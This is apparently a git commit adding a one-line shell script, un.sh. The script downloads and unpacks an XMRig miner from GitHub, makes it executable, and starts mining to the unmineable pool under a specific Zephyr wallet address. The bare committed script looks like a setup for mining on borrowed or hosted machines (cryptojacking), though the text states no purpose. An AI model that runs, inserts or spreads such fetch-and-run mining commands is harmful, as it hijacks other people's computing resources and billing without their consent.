71043c18d0fc04bfc2add95e91924049b52b4eaa
karina1121111 <karinsonia631@gmail.com>
2024-10-26 08:00:09 -0700

    Create un.sh

---
+++ un.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.22.1/xmrig-6.22.1-linux-static-x64.tar.gz && tar -xvf xmrig-6.22.1-linux-static-x64.tar.gz && cd xmrig-6.22.1 && chmod +x xmrig && ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u ZEPH:ZEPHYR2d3XF4iomcChXdVAi7YWDXGdLBKP26ETUH8m9UfE9G9CEvootEe2kGanfLGZHFG9eH3qeEx3KmxH2JqFbme3odsKNkF3P5P.unmineable -p x 
